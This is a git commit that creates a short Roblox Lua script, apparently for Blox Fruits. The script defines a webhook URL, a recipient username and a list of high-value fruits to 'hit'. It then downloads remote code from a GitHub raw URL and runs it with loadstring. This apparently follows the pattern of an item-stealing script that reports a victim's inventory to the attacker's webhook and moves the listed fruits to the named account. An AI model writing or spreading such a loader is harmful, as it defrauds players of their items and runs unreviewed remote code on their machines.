d08f9de3b7b20f100ce1de0fd8ed9f3ec4b9cc1e
reds8 <advin9389@gmail.com>
2025-04-11 17:33:27 +0530

    Create redssreal.lua

---
+++ redssreal.lua
@@ -0,0 +1,6 @@
+
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=Z1dDS24tZV9kM3BuZDFJTWJMQVdZZzpURDhEVTJZNElwOGJYUVRjRDR4c1NvNkxyb0RCM3NWNUJTUUhUSmtFLTlyOXJFT0VjdGVrLS04Q1UwNDJGc0ZDM1BxdGdIWW9xZUZIZTBsS2lGUUlXTklfczBKa2VNQnprSHdoMzFEdjVVbS1mb3hpenh1VExSajFqV2ZwWnhrYzJJckgwZWhwNWNWQnM2VnRxVVJIRUxfdEU5ZldtN20xamlVSXlRZnRGSUE"
+Usernames = {"simos55599"}
+FruitsToHit = {"Gravity-Gravity", "Mammoth-Mammoth", "T-Rex-T-Rex", "Dough-Dough", "Control-Control", "Gas-Gas", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
